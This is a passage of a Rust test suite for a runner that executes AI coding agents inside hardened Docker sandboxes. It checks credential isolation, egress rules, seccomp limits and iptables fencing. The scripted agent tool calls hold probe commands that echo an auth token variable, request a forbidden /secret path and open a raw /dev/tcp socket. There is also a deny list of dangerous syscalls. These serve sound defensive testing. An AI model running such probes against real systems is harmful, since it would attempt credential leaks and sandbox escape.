            "spec_version: 1\nname: toto-task\ndescription: test agent\nexecutor:\n  type: omnigent\n  config: {{harness: {harness}}}\n  model: {model}\nprompt: Complete the task.\n{extra_yaml}\n"
        );
        files.insert("config.yaml".to_string(), cfg.into_bytes());
        for (name, md) in skills {
            files.insert(format!("skills/{name}/SKILL.md"), md.as_bytes().to_vec());
        }
        files
    }

    pub const NO_SANDBOX: &str = "os_env:\n  type: caller_process\n  cwd: \".\"\n  sandbox: {type: none}";

    /// The approval a contributor would have for `image` with this agent (image info read live).
    pub fn approval(image: &str, files: &std::collections::BTreeMap<String, Vec<u8>>) -> crate::projects::Approval {
        let info = crate::image::inspect("docker", image, false).unwrap();
        crate::projects::Approval::new(image, info, files, Some("deadbeef".into()), false).unwrap()
    }

    fn sock_dir(f: &super::Fixture) -> std::path::PathBuf {
        let dir = f.dir.join("sock");
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::set_permissions(&dir, std::fs::Permissions::from_mode(0o700)).unwrap();
        dir
    }

    /// The whole pipeline, as the daemon runs it: the project's agent directory (with a skill) and
    /// image are approved; a task with inputs runs; Omnigent inside the image runs a shell tool as
    /// an unprivileged user; the credential never enters the container; only the changed file comes back.
    #[test]
    fn the_runner_drives_the_whole_pipeline_with_the_projects_agent() {
        use crate::archive::{self, Record};
        use crate::config::{Config, HarnessConfig, ProviderConfig, SandboxConfig};
        use crate::queue::DirQueue;
        use chrono::Local;
        if !docker_has("toto-omnigent-test") {
            eprintln!("skipping: needs docker and the toto-omnigent-test image");
            return;
        }
        let f = fixture("omni-runner");
        let (url, seen) = fake_scripted(vec![
            ("ToolSearch", serde_json::json!({"query": "select:mcp__omnigent__sys_os_shell", "max_results": 1})),
            ("mcp__omnigent__sys_os_shell", serde_json::json!({"command": "cat calc.txt; echo fixed > calc.txt; ls /tmp/toto-agent/skills; id -u; echo secret-check=${ANTHROPIC_AUTH_TOKEN:-unset}"})),
        ]);
        let mut cfg = Config::starter(&f.dir);
        cfg.sandbox = SandboxConfig::Docker { bin: "docker".into(), runtime: None, nested_userns: false, network: None };
        cfg.harness = HarnessConfig::Omnigent { provider: ProviderConfig::Anthropic, upstream: Some(url), token_file: None, api_key_file: None };
        cfg.policy = super::policy();
        cfg.policy.daily_token_cap = 10_000_000;
        cfg.projects.insert("a".into(), hex::encode(f.key_a.verifying_key().to_bytes()));
        let files = agent_dir("claude-sdk", "claude-fake", NO_SANDBOX, &[("triage", "---\nname: triage\ndescription: t\n---\nTriage.")]);
        cfg.environments.insert("a".into(), approval("toto-omnigent-test", &files));
        std::fs::create_dir_all(&cfg.state_dir).unwrap();
        crate::secrets::save_token(&cfg.token_path(), "REAL-SECRET-TOKEN").unwrap();

        let q = DirQueue::new(&cfg.queue_dir).unwrap();
        let inputs = q.post_bundle(&archive::to_bytes(&[Record::File { path: "calc.txt".into(), mode: 0o644, data: b"bug\n".to_vec() }]).unwrap()).unwrap();
        let mut t = task("o1", "a", 100000, &f.key_a);
        t.prompt = "RUN-THE-TOOL".into();
        t.inputs = inputs;
        t.sandbox_profile.timeout_secs = 170;
        t.output_schema.max_artifact_bytes = 1 << 20;
        q.post(&t.sign(&f.key_a).unwrap()).unwrap();

        let mut runner = cfg.build().unwrap();
        runner.sandbox.probe().unwrap();
        let started = std::time::Instant::now();
        let tick = runner.tick(Local::now()).unwrap();
        eprintln!("FACT pipeline took {:?}", started.elapsed());
        assert_eq!(tick, crate::runner::Tick::Submitted("o1".into()), "audit: {:?}", runner.audit.entries().unwrap());
        let results = q.results().unwrap();
        let body = results[0].open().unwrap();
        assert!(body.output.contains("DONE-FROM-FAKE-API"), "{}", body.output);
        let recs = results[0].artifact_records(1 << 22).unwrap();
        assert_eq!(recs, vec![Record::File { path: "calc.txt".into(), mode: 0o644, data: b"fixed\n".to_vec() }], "only the changed input comes back");
        let bodies = seen.lock().unwrap().clone();
        let last = bodies.iter().map(|(_, b)| b.as_str()).filter(|b| b.contains("tool_result")).max_by_key(|b| b.matches("tool_result").count()).expect("tool results reached the model");
        for want in ["bug", "triage", "65534", "secret-check=not-a-credential"] {
            assert!(last.contains(want), "the agent should have seen {want:?} in: {}", &last[last.find("tool_result").unwrap_or(0)..last.len().min(last.find("tool_result").unwrap_or(0) + 600)]);
        }
        assert!(bodies.iter().filter(|(h, _)| h.iter().any(|(k, v)| k == "path" && v.starts_with("/v1/messages"))).all(|(h, _)| h.iter().any(|(k, v)| k == "authorization" && v == "Bearer REAL-SECRET-TOKEN")), "every model call carried the proxy's credential");
        let log = runner.audit.entries().unwrap();
        assert!(log[0].outcome == "submitted" && log[0].tokens > 50, "metered by the proxy: {log:?}");
        assert!(!bodies.iter().any(|(_, b)| b.contains("REAL-SECRET")));
    }

    /// The provider refuses (429) while Omnigent runs: the harness stops at once instead of
    /// letting the agent retry against a closed door, and reports a quota error, not a failure.
    #[test]
    fn a_refusal_from_the_provider_stops_the_run_as_a_quota_pause() {
        use crate::harness::Harness;
        use crate::meter::UsageMeter;
        use crate::omnigent::{ApprovedAgent, OmnigentHarness};
        use crate::sandbox::Environment;
        if !docker_has("toto-omnigent-test") {
            eprintln!("skipping: needs docker and the toto-omnigent-test image");
            return;
        }
        let f = fixture("omni-429");
        let (url, _) = super::proxy::upstream_with(429, "application/json", "retry-after: 60\r\nanthropic-ratelimit-unified-status: rejected\r\n", br#"{"type":"error","error":{"type":"rate_limit_error","message":"out of allowance"}}"#.to_vec());
        let proxy = Arc::new(AuthProxy::start(&sock_dir(&f).join("p.sock"), &url, crate::proxy::Provider::Anthropic, Auth::Bearer { token: "T".into(), oauth: true }).unwrap());
        let mut sb = DockerSandbox::new();
        sb.proxy_socket = Some(proxy.socket().to_path_buf());
        sb.environments.insert("a".into(), Environment { image: "toto-omnigent-test".into(), network: false });
        let mut t = task("q429", "a", 100000, &f.key_a);
        t.sandbox_profile.timeout_secs = 170;
        let ws = sb.create(&t, &t.sandbox_profile).unwrap();
        let mut h = OmnigentHarness::new(proxy.clone(), crate::proxy::Provider::Anthropic);
        h.agents.insert("a".into(), ApprovedAgent { tar: crate::agent::pack(&agent_dir("claude-sdk", "claude-fake", NO_SANDBOX, &[])).unwrap(), harness: "claude-sdk".into() });
        let started = std::time::Instant::now();
        let e = h.run(&t, &ws, &mut UsageMeter::new(1_000_000, 25)).unwrap_err();
        eprintln!("FACT 429 run stopped after {:?}: {e}", started.elapsed());
        sb.destroy(ws).unwrap();
        assert!(matches!(e, crate::Error::Quota(_)), "{e}");
        assert!(e.to_string().contains("refused") && e.to_string().contains("retry after 60s"), "{e}");
        let q = h.quota().unwrap();
        assert!(q.limited && q.retry_after == Some(60));
        assert!(started.elapsed() < std::time::Duration::from_secs(120), "stopped at the first refusal, not after the agent's own retries");
    }

    /// A project whose agent uses a harness this runner has no credential for is refused before anything runs.
    #[test]
    fn a_harness_needing_the_other_credential_is_refused() {
        use crate::harness::Harness;
        use crate::meter::UsageMeter;
        use crate::omnigent::{ApprovedAgent, OmnigentHarness};
        let f = fixture("omni-mismatch");
        let (url, _) = fake_scripted(vec![]);
        let proxy = Arc::new(AuthProxy::start(&sock_dir(&f).join("p.sock"), &url, crate::proxy::Provider::Anthropic, Auth::Bearer { token: "x".into(), oauth: true }).unwrap());
        let mut h = OmnigentHarness::new(proxy, crate::proxy::Provider::Anthropic);
        h.agents.insert("a".into(), ApprovedAgent { tar: vec![], harness: "codex".into() });
        let ws = Workspace { task_id: "t".into(), path: Default::default(), exec_prefix: vec!["docker".into(), "exec".into(), "-i".into(), "nothing".into()] };
        let e = h.run(&task("t", "a", 1, &f.key_a), &ws, &mut UsageMeter::new(100, 25)).unwrap_err().to_string();
        assert!(e.contains("codex") && e.contains("OpenAi"), "{e}");
        let e = h.run(&task("t", "b", 1, &f.key_a), &ws, &mut UsageMeter::new(100, 25)).unwrap_err().to_string();
        assert!(e.contains("no approved agent"), "{e}");
    }

    /// The project's agent config carries Omnigent's own sandbox with egress rules; nested inside
    /// our container (with the nested-userns profile) they decide what a tool may reach.
    #[test]
    fn the_projects_egress_rules_are_enforced_inside_the_container() {
        use crate::harness::Harness;
        use crate::meter::UsageMeter;
        use crate::omnigent::{ApprovedAgent, OmnigentHarness};
        use crate::sandbox::Environment;
        if !docker_has("toto-omnigent-test") {
            eprintln!("skipping: needs docker and the toto-omnigent-test image (with bwrap)");
            return;
        }
        let f = fixture("omni-egress");
        // A local web server on the docker bridge gateway stands in for "the internet". The agent's
        // rules allow `GET /ok` only; the server records every path it is asked for.
        let gw = "172.17.0.1";
        let listener = std::net::TcpListener::bind((gw, 0)).or_else(|_| std::net::TcpListener::bind("0.0.0.0:0")).unwrap();
        let port = listener.local_addr().unwrap().port();
        let hits: Arc<Mutex<Vec<String>>> = Default::default();
        {
            let hits = hits.clone();
            std::thread::spawn(move || {
                for s in listener.incoming().flatten() {
                    let mut line = String::new();
                    let _ = BufReader::new(&s).read_line(&mut line);
                    hits.lock().unwrap().push(line.trim().to_string());
                    let mut s = s;
                    let _ = s.write_all(b"HTTP/1.1 200 OK\r\nContent-Length: 4\r\nConnection: close\r\n\r\nopen");
                }
            });
        }
        let base = format!("http://{gw}:{port}");
        let cmd = "echo uid=$(id -u); req() { python3 - \"$1\" \"$2\" <<'PY'\nimport sys,urllib.request as u\ntry:\n    r=u.urlopen(u.Request('@BASE@'+sys.argv[2],data=b'{}' if sys.argv[1]=='POST' else None,method=sys.argv[1]),timeout=8); print('status',r.status,r.read()[:20])\nexcept Exception as e: print('fail',type(e).__name__,str(e)[:60])\nPY\n}; echo ALLOWED:; req GET /ok; echo WRONGPATH:; req GET /secret; echo WRONGMETHOD:; req POST /ok; echo RAW:; (exec 3<>/dev/tcp/@GW@/@PORT@ && echo raw-connected) 2>&1 | head -c 100; echo; echo END:"
            .replace("@BASE@", &base).replace("@GW@", gw).replace("@PORT@", &port.to_string());
        let (url, seen) = fake_scripted(vec![
            ("ToolSearch", serde_json::json!({"query": "select:mcp__omnigent__sys_os_shell", "max_results": 1})),
            ("mcp__omnigent__sys_os_shell", serde_json::json!({"command": cmd})),
        ]);
        let proxy = Arc::new(AuthProxy::start(&sock_dir(&f).join("p.sock"), &url, crate::proxy::Provider::Anthropic, Auth::Bearer { token: "REAL-SECRET-TOKEN".into(), oauth: true }).unwrap());
        let profile = f.dir.join("seccomp.json");
        std::fs::write(&profile, include_str!("../profiles/seccomp-nested-userns.json")).unwrap();
        // The project's config, as it would commit it. `egress_allow_private_destinations` only
        // because the stand-in server sits on the docker bridge; a real project reaches public hosts.
        let sandbox_yaml = format!("os_env:\n  type: caller_process\n  cwd: \".\"\n  sandbox:\n    type: linux_bwrap\n    write_paths: [\".\"]\n    allow_network: true\n    egress_allow_private_destinations: true\n    egress_rules: [\"GET {gw}/ok\"]");
        let files = agent_dir("claude-sdk", "claude-fake", &sandbox_yaml, &[]);
        let summary = crate::agent::summarize(&files).unwrap();
        assert!(summary.needs_network && summary.needs_nested_sandbox() && summary.egress_rules == [format!("GET {gw}/ok")]);
        let mut sb = DockerSandbox::new();
        sb.network = Some("bridge".into()); // the plain bridge, so the gateway stand-in is reachable
        sb.proxy_socket = Some(proxy.socket().to_path_buf());
        sb.seccomp_profile = Some(profile);
        sb.environments.insert("a".into(), Environment { image: "toto-omnigent-test".into(), network: true });
        let mut t = task("eg1", "a", 100000, &f.key_a);
        t.prompt = "RUN-THE-TOOL".into();
        t.sandbox_profile.timeout_secs = 170;
        let ws = sb.create(&t, &t.sandbox_profile).unwrap();
        let mut h = OmnigentHarness::new(proxy.clone(), crate::proxy::Provider::Anthropic);
        h.agents.insert("a".into(), ApprovedAgent { tar: crate::agent::pack(&files).unwrap(), harness: "claude-sdk".into() });
        let started = std::time::Instant::now();
        let r = h.run(&t, &ws, &mut UsageMeter::new(1_000_000, 25));
        eprintln!("FACT egress run took {:?}: {:?}", started.elapsed(), r.as_ref().map(|s| s.chars().take(100).collect::<String>()).map_err(|e| e.to_string().chars().take(1500).collect::<String>()));
        let bodies = seen.lock().unwrap().clone();
        let last = bodies.iter().map(|(_, b)| b.as_str()).filter(|b| b.contains("tool_result")).max_by_key(|b| b.matches("tool_result").count()).unwrap_or("");
        let shell = last.rfind("uid=").map(|i| last[i..].replace("\\n", "\n")).unwrap_or_default();
        let section = |from: &str, to: &str| -> String { shell.split(from).nth(1).and_then(|r| r.split(to).next()).unwrap_or("").trim().to_string() };
        assert!(shell.starts_with("uid=65534"), "tool runs unprivileged: {shell}");
        assert!(section("ALLOWED:", "WRONGPATH:").contains("status 200"), "rule-allowed request passes: {shell}");
        assert!(section("WRONGPATH:", "WRONGMETHOD:").contains("403"), "other paths are refused: {shell}");
        assert!(section("WRONGMETHOD:", "RAW:").contains("403"), "other methods are refused: {shell}");
        assert!(!section("RAW:", "END:").contains("raw-connected"), "no direct socket: {shell}");
        let seen_paths = hits.lock().unwrap().clone();
        assert!(seen_paths.iter().any(|l| l.starts_with("GET /ok")), "server got the allowed request: {seen_paths:?}");
        assert!(!seen_paths.iter().any(|l| l.contains("/secret") || l.starts_with("POST")), "forbidden requests never reached the server: {seen_paths:?}");
        sb.destroy(ws).unwrap();
        r.expect("omnigent with the project's nested sandbox should finish");
    }
}

mod codex_in_container {
    use super::proxy_container::docker_has;
    use super::{fixture, task};
    use crate::proxy::{Auth, AuthProxy, Provider};
    use crate::sandbox::{exec_io, DockerSandbox, Sandbox};
    use std::io::{BufRead, BufReader, Read, Write};
    use std::os::unix::fs::PermissionsExt;
    use std::sync::{Arc, Mutex};
    use std::time::Duration;

    type Bodies = Arc<Mutex<Vec<(Vec<(String, String)>, String)>>>;

    fn ev(kind: &str, data: serde_json::Value) -> String {
        format!("event: {kind}\ndata: {data}\n\n")
    }

    fn completed(output: serde_json::Value) -> String {
        ev("response.completed", serde_json::json!({"type": "response.completed", "response": {"id": "resp_1", "status": "completed", "output": output, "usage": {"input_tokens": 30, "output_tokens": 12, "total_tokens": 42}}}))
    }

    /// Responses stream: a final assistant message.
    fn message_stream(text: &str) -> String {
        let item = serde_json::json!({"type": "message", "id": "msg_1", "role": "assistant", "status": "completed", "content": [{"type": "output_text", "text": text}]});
        ev("response.created", serde_json::json!({"type": "response.created", "response": {"id": "resp_1", "status": "in_progress"}}))
            + &ev("response.output_item.added", serde_json::json!({"type": "response.output_item.added", "output_index": 0, "item": {"type": "message", "id": "msg_1", "role": "assistant", "status": "in_progress", "content": []}}))
            + &ev("response.output_item.done", serde_json::json!({"type": "response.output_item.done", "output_index": 0, "item": item}))
            + &completed(serde_json::json!([item]))
    }

    /// Responses stream: a call to Codex's JavaScript `exec` custom tool.
    fn exec_stream(js: &str) -> String {
        let item = serde_json::json!({"type": "custom_tool_call", "id": "ctc_1", "call_id": "call_1", "name": "exec", "input": js, "status": "completed"});
        ev("response.created", serde_json::json!({"type": "response.created", "response": {"id": "resp_1", "status": "in_progress"}}))
            + &ev("response.output_item.added", serde_json::json!({"type": "response.output_item.added", "output_index": 0, "item": {"type": "custom_tool_call", "id": "ctc_1", "call_id": "call_1", "name": "exec", "input": "", "status": "in_progress"}}))
            + &ev("response.output_item.done", serde_json::json!({"type": "response.output_item.done", "output_index": 0, "item": item}))
            + &completed(serde_json::json!([item]))
    }

    /// A fake Responses API: runs one `exec` call (the JS in `js`) after RUN-THE-TOOL, then answers.
    fn fake_responses(js: String) -> (String, Bodies) {
        let l = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
        let url = format!("http://{}", l.local_addr().unwrap());
        let seen: Bodies = Arc::new(Mutex::new(Vec::new()));
        let log = seen.clone();
        std::thread::spawn(move || {
            for s in l.incoming().flatten() {
                let (log, js) = (log.clone(), js.clone());
                std::thread::spawn(move || {
                    let mut r = BufReader::new(s.try_clone().unwrap());
                    let mut first = String::new();
                    if r.read_line(&mut first).unwrap_or(0) == 0 {
                        return;
                    }
                    let mut headers = vec![("path".to_string(), first.split_whitespace().nth(1).unwrap_or("").to_string())];
                    loop {
                        let mut h = String::new();
                        r.read_line(&mut h).unwrap();
                        if h.trim().is_empty() {
                            break;
                        }
                        if let Some((k, v)) = h.split_once(':') {
                            headers.push((k.trim().to_ascii_lowercase(), v.trim().to_string()));
                        }
                    }
                    let len: usize = headers.iter().find(|(k, _)| k == "content-length").and_then(|(_, v)| v.parse().ok()).unwrap_or(0);
                    let mut b = vec![0u8; len];
                    r.read_exact(&mut b).unwrap();
                    let body = String::from_utf8_lossy(&b).to_string();
                    log.lock().unwrap().push((headers, body.clone()));
                    let parsed: serde_json::Value = serde_json::from_str(&body).unwrap_or_default();
                    let has_output = parsed["input"].as_array().into_iter().flatten().any(|i| i["type"] == "custom_tool_call_output");
                    let payload = if has_output {
                        message_stream("DONE-FROM-FAKE-API")
                    } else if body.contains("RUN-THE-TOOL") {
                        exec_stream(&js)
                    } else {
                        message_stream("ok")
                    };
                    let mut s = s;
                    let _ = write!(s, "HTTP/1.1 200 OK\r\ncontent-type: text/event-stream\r\ncontent-length: {}\r\nconnection: close\r\n\r\n{payload}", payload.len());
                });
            }
        });
        (url, seen)
    }

    fn codex_bin() -> Option<std::path::PathBuf> {
        if let Some(p) = std::env::var_os("CODEX_BIN") {
            return std::fs::canonicalize(p).ok();
        }
        let out = std::process::Command::new("which").arg("codex").output().ok()?;
        let p = String::from_utf8_lossy(&out.stdout).trim().to_string();
        (!p.is_empty()).then(|| std::fs::canonicalize(p).ok()).flatten()
    }

    /// `toto-omnigent-test` plus the host's codex binaries copied in, built on the fly.
    fn image_with_codex() -> Option<String> {
        let codex = codex_bin()?;
        let host = codex.with_file_name("codex-code-mode-host");
        if !host.exists() || !docker_has("toto-omnigent-test") {
            return None;
        }
        let dir = std::env::temp_dir().join("toto-codex-image");
        std::fs::create_dir_all(&dir).ok()?;
        std::fs::copy(&codex, dir.join("codex")).ok()?;
        std::fs::copy(&host, dir.join("codex-code-mode-host")).ok()?;
        std::fs::write(dir.join("Dockerfile"), "FROM toto-omnigent-test\nCOPY codex codex-code-mode-host /usr/local/bin/\n").ok()?;
        let ok = std::process::Command::new("docker").args(["build", "-q", "-t", "toto-omnigent-codex-test", dir.to_str()?]).output().ok()?.status.success();
        ok.then(|| "toto-omnigent-codex-test".to_string())
    }

    /// Omnigent's `codex` harness, named by the project's agent config, inside the project's
    /// image, behind the OpenAI profile.
    #[test]
    fn codex_through_omnigent_in_the_container() {
        use crate::harness::Harness;
        use crate::meter::UsageMeter;
        use crate::omnigent::{ApprovedAgent, OmnigentHarness};
        use crate::sandbox::Environment;
        use super::omnigent_in_container::{agent_dir, NO_SANDBOX};
        let Some(image) = image_with_codex() else {
            eprintln!("skipping: needs docker, the toto-omnigent-test image and a static codex binary (CODEX_BIN)");
            return;
        };
        let f = fixture("codex-omni");
        let (url, seen) = fake_responses(r#"text(JSON.stringify(await tools.exec_command({cmd: "echo hello-via-omnigent-codex > /workspace/x.txt; id -u"})));"#.to_string());
        let dir = f.dir.join("sock");
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::set_permissions(&dir, std::fs::Permissions::from_mode(0o700)).unwrap();
        let proxy = Arc::new(AuthProxy::start(&dir.join("p.sock"), &url, Provider::OpenAi, Auth::Bearer { token: "sk-REAL-OPENAI".into(), oauth: false }).unwrap());
        let mut sb = DockerSandbox::new();
        sb.proxy_socket = Some(proxy.socket().to_path_buf());
        sb.environments.insert("a".into(), Environment { image, network: false });
        let mut t = task("cx2", "a", 100000, &f.key_a);
        t.prompt = "RUN-THE-TOOL please".into();
        t.sandbox_profile.timeout_secs = 170;
        let ws = sb.create(&t, &t.sandbox_profile).unwrap();

        let files = agent_dir("codex", "gpt-5-codex", NO_SANDBOX, &[]);
        let mut h = OmnigentHarness::new(proxy.clone(), Provider::OpenAi);
        h.agents.insert("a".into(), ApprovedAgent { tar: crate::agent::pack(&files).unwrap(), harness: "codex".into() });
        let started = std::time::Instant::now();
        let r = h.run(&t, &ws, &mut UsageMeter::new(1_000_000, 25));
        eprintln!("FACT omnigent+codex took {:?}: {:?}", started.elapsed(), r.as_ref().map(|s| s.chars().take(160).collect::<String>()).map_err(|e| e.to_string().chars().take(900).collect::<String>()));
        let out = r.expect("omnigent with the codex harness should finish");
        assert!(out.contains("DONE-FROM-FAKE-API"), "{out}");
        let check = exec_io(&ws, &["cat", "/workspace/x.txt"], None, Duration::from_secs(10), 1024).unwrap();
        assert_eq!(String::from_utf8_lossy(&check.stdout), "hello-via-omnigent-codex\n", "the tool ran in the container");
        let bodies = seen.lock().unwrap().clone();
        let calls: Vec<_> = bodies.iter().filter(|(h, _)| h.iter().any(|(k, v)| k == "path" && v == "/v1/responses")).collect();
        assert!(calls.len() >= 2);
        for (h, _) in &calls {
            let auth: Vec<&str> = h.iter().filter(|(k, _)| k == "authorization").map(|(_, v)| v.as_str()).collect();
            assert_eq!(auth, ["Bearer sk-REAL-OPENAI"]);
        }
        assert!(proxy.tokens() > 0);
        sb.destroy(ws).unwrap();
    }
}

mod nested_userns {
    use super::proxy_container::docker_has;
    use super::{fixture, task};
    use crate::sandbox::{exec, DockerSandbox, Environment, Sandbox};
    use std::collections::BTreeSet;
    use std::time::Duration;

    const PROFILE: &str = include_str!("../profiles/seccomp-nested-userns.json");

    /// Syscalls the profile allows with no argument filter and no capability condition.
    fn unconditional(p: &serde_json::Value) -> BTreeSet<String> {
        p["syscalls"].as_array().unwrap().iter()
            .filter(|r| r["action"] == "SCMP_ACT_ALLOW" && r.get("args").is_none_or(|a| a.as_array().is_none_or(Vec::is_empty)) && r["includes"]["caps"].is_null())
            .flat_map(|r| r["names"].as_array().unwrap().iter().map(|n| n.as_str().unwrap().to_string()))
            .collect()
    }

    #[test]
    fn profile_adds_exactly_what_a_nested_bwrap_needs() {
        let p: serde_json::Value = serde_json::from_str(PROFILE).unwrap();
        let allowed = unconditional(&p);
        for needed in ["clone", "unshare", "mount", "umount2", "pivot_root", "sethostname"] {
            assert!(allowed.contains(needed), "{needed} must be allowed");
        }
        // Still blocked without capabilities, as in Docker's default: the surface we did not open.
        for danger in ["bpf", "keyctl", "add_key", "request_key", "perf_event_open", "kexec_load", "kexec_file_load", "init_module", "finit_module", "delete_module", "reboot", "open_by_handle_at", "setns", "chroot", "swapon", "acct", "settimeofday", "clock_settime", "syslog", "ptrace_unused"] {
            assert!(!allowed.contains(danger), "{danger} must stay blocked");
        }
        // clone3 keeps Docker's behaviour (ENOSYS without caps), so glibc falls back to clone.
        let clone3: Vec<_> = p["syscalls"].as_array().unwrap().iter().filter(|r| r["names"].as_array().unwrap().iter().any(|n| n == "clone3")).collect();
        assert!(clone3.iter().any(|r| r["action"] == "SCMP_ACT_ERRNO" && r["errnoRet"] == 38));
        assert!(!allowed.contains("clone3"));
        assert_eq!(p["defaultAction"], "SCMP_ACT_ERRNO", "deny by default");
    }

    #[test]
    fn profile_is_opt_in_and_the_rest_of_the_hardening_stays() {
        let mut sb = DockerSandbox::new();
        let env = Environment { image: "img".into(), network: false };
        let plain = sb.run_args("t", &env, &Default::default()).unwrap().join(" ");
        assert!(!plain.contains("seccomp"), "Docker's default profile unless opted in");
        sb.seccomp_profile = Some("/p/seccomp.json".into());
        let with = sb.run_args("t", &env, &Default::default()).unwrap().join(" ");
        assert!(with.contains("--security-opt seccomp=/p/seccomp.json"));
        for kept in ["--network none", "--read-only", "--cap-drop ALL", "no-new-privileges", "--user 65534:65534", "--pids-limit 256"] {
            assert!(with.contains(kept), "{kept} must remain: {with}");
        }
    }

    #[test]
    fn nested_bwrap_runs_with_the_profile_and_not_without_it() {
        if !docker_has("toto-omnigent-test") {
            eprintln!("skipping: needs docker and the toto-omnigent-test image (with bwrap)");
            return;
        }
        let f = fixture("userns");
        let profile = f.dir.join("seccomp.json");
        std::fs::write(&profile, PROFILE).unwrap();
        let t = task("us1", "a", 1, &f.key_a);
        let run = |with_profile: bool, id: &str| {
            let mut sb = DockerSandbox::new();
            sb.environments.insert("a".into(), Environment { image: "toto-omnigent-test".into(), network: false });
            sb.seccomp_profile = with_profile.then(|| profile.clone());
            let mut t = t.clone();
            t.id = id.into();
            let ws = sb.create(&t, &t.sandbox_profile).unwrap();
            let bw = "bwrap".to_string();
            // bwrap with its own user and network namespaces: what Omnigent's egress enforcement uses
            let inner = exec(&ws, &[bw.as_str(), "--unshare-user", "--unshare-net", "--ro-bind", "/", "/", "--dev", "/dev", "sh", "-c", "id -u; ls /sys/class/net | tr '\\n' ' '"], Duration::from_secs(20)).unwrap();
            let outer = exec(&ws, &["sh", "-c", "id -u; cat /proc/self/status | grep -E '^CapEff'; (wget -T 2 -q -O- http://1.1.1.1 >/dev/null 2>&1 && echo net-open) || echo net-closed"], Duration::from_secs(20)).unwrap();
            sb.destroy(ws).unwrap();
            (inner, String::from_utf8_lossy(&outer.stdout).to_string())
        };
        let (inner, outer) = run(true, "us1");
        assert!(inner.status.success(), "nested bwrap must work with the profile: {}", String::from_utf8_lossy(&inner.stderr));
        assert!(String::from_utf8_lossy(&inner.stdout).starts_with("65534") || String::from_utf8_lossy(&inner.stdout).starts_with("0"), "{}", String::from_utf8_lossy(&inner.stdout));
        assert!(outer.contains("65534") && outer.contains("CapEff:\t0000000000000000") && outer.contains("net-closed"), "outer container is still unprivileged and offline: {outer}");
        let (blocked, _) = run(false, "us2");
        assert!(!blocked.status.success() && String::from_utf8_lossy(&blocked.stderr).contains("No permissions to create new namespace"), "without the profile Docker's default must refuse: {}", String::from_utf8_lossy(&blocked.stderr));
    }
}

mod netfence {
    use crate::netfence::*;
    use std::process::Command;

    fn sh(script: &str) -> bool {
        Command::new("sh").args(["-c", script]).status().is_ok_and(|s| s.success())
    }

    #[test]
    fn the_script_covers_every_private_range_and_dns() {
        let s = script("docker", "toto-egress", "172.30.0.0/24", &resolvers("nameserver 127.0.0.53\nnameserver 192.168.1.1\nsearch x\nnameserver 8.8.8.8"));
        for r in PRIVATE_RANGES {
            assert!(s.contains(&format!("-s 172.30.0.0/24 -d {r} -j DROP")), "{r}");
        }
        assert!(s.contains("INPUT -s 172.30.0.0/24 -j DROP"), "host itself");
        assert!(s.contains("-d 192.168.1.1 -p udp --dport 53 -j ACCEPT") && s.contains("-d 8.8.8.8 -p tcp --dport 53 -j ACCEPT"));
        assert!(!s.contains("127.0.0.53"), "loopback resolvers are not reachable from a container");
        assert!(s.matches("iptables -C").count() == s.matches("|| iptables -I").count(), "every rule is idempotent");
    }

    /// Live: an unfenced bridge is refused, the generated script fences it, teardown removes it.
    #[test]
    fn verify_refuses_an_unfenced_network_and_accepts_the_fenced_one() {
        let have = |c: &str| Command::new("sh").args(["-c", &format!("command -v {c}")]).output().is_ok_and(|o| o.status.success());
        if !have("docker") || !have("iptables") || !super::proxy_container::docker_has("toto-omnigent-test") || !sh("iptables -S >/dev/null 2>&1") {
            eprintln!("skipping: needs docker, root iptables and the toto-omnigent-test image");
            return;
        }
        let (net, subnet, image) = ("toto-test-fence", "172.31.77.0/24", "toto-omnigent-test");
        assert!(sh(&format!("docker network rm {net} >/dev/null 2>&1; docker network create --subnet {subnet} {net} >/dev/null")));
        let dns = resolvers(&std::fs::read_to_string("/etc/resolv.conf").unwrap_or_default());
        let unfenced = verify("docker", net, image);
        assert!(unfenced.as_ref().is_err_and(|e| e.to_string().contains("not fenced")), "{unfenced:?}");
        assert!(sh(&script("docker", net, subnet, &dns)), "script runs (and twice, idempotently)");
        assert!(sh(&script("docker", net, subnet, &dns)));
        let fenced = verify("docker", net, image);
        assert!(sh(&teardown_script("docker", net, subnet, &dns)));
        assert!(sh(&format!("! iptables -S INPUT | grep -q -- '-s {subnet}'")), "teardown removes the rules");
        fenced.expect("fenced network passes");
    }
}

mod doctor {
    use crate::config::{Config, HarnessConfig, SandboxConfig};
    use crate::doctor::*;

    fn cfg(name: &str) -> Config {
        let dir = std::env::temp_dir().join(format!("toto-test-doctor-{name}-{}", std::process::id()));
        let mut c = Config::starter(&dir);
        c.sandbox = SandboxConfig::Dir;
        c.harness = HarnessConfig::Echo { tokens_per_run: 1 };
        c
    }

    #[test]
    fn a_dev_setup_passes_with_warnings_that_say_what_is_missing() {
        let checks = run_all(&cfg("dev"));
        assert!(passed(&checks), "{checks:?}");
        let text: String = checks.iter().map(|c| c.to_string()).collect::<Vec<_>>().join("\n");
        for want in ["none: nothing will run", "no isolation", "placeholder"] {
            assert!(text.contains(want), "missing `{want}` in:\n{text}");
        }
    }

    #[test]
    fn approved_environments_are_checked_against_the_setup() {
        let mut c = cfg("envs");
        c.sandbox = SandboxConfig::Docker { bin: "docker".into(), runtime: None, nested_userns: false, network: None };
        let files = super::omnigent_in_container::agent_dir("claude-sdk", "m", "os_env:\n  type: caller_process\n  cwd: \".\"\n  sandbox: {type: linux_bwrap, allow_network: true, egress_rules: [\"GET a.org/**\"]}", &[]);
        let info = crate::image::ImageInfo { id: "sha256:abc".into(), digest: Some(format!("sha256:{}", "ab".repeat(32))), user: String::new(), env: vec![], entrypoint: vec![], cmd: vec![], size: 1, history: vec![] };
        c.environments.insert("acme".into(), crate::projects::Approval::new("ghcr.io/acme/env:1", info, &files, None, false).unwrap());
        let checks = run_all(&c);
        let text: String = checks.iter().map(|k| k.to_string()).collect::<Vec<_>>().join("\n");
        assert!(text.contains("acme: ghcr.io/acme/env:1"), "{text}");
        assert!(text.contains("needs a network, none configured") && text.contains("nested_userns"), "the agent's needs are checked against the setup: {text}");
        assert!(!passed(&checks));
    }

    #[test]
    fn a_harness_mismatch_is_reported() {
        let mut c = cfg("mismatch");
        c.sandbox = SandboxConfig::Docker { bin: "docker".into(), runtime: None, nested_userns: false, network: None };
        c.harness = HarnessConfig::Omnigent { provider: crate::config::ProviderConfig::Openai, upstream: None, token_file: None, api_key_file: None };
        let checks = run_all(&c);
        assert!(!passed(&checks));
